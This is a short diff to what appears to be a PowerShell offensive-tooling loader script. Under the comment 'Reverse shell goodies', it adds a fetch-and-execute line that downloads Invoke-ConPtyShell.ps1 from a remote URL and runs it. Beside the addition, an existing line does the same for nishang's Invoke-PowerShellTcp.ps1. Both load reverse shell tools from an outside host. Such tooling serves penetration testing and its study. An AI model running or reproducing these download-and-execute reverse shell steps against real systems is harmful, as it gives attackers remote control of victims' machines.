@@ -147,6 +147,12 @@ if (!($languagemode -match "constrained")) {
     }
 
     # Reverse shell goodies
+    $iex ($iwr $url/ConPtyShell/Invoke-ConPtyShell.ps1)
+    if (\$?) {
+        echo "Imported ConPtyShell"
+    } else {
+        echo "Failed to import ConPtyShell"
+    }
     $iex ($iwr $url/nishang/Shells/Invoke-PowerShellTcp.ps1)
     if (\$?) {
         echo "Imported PowerShellTcp"
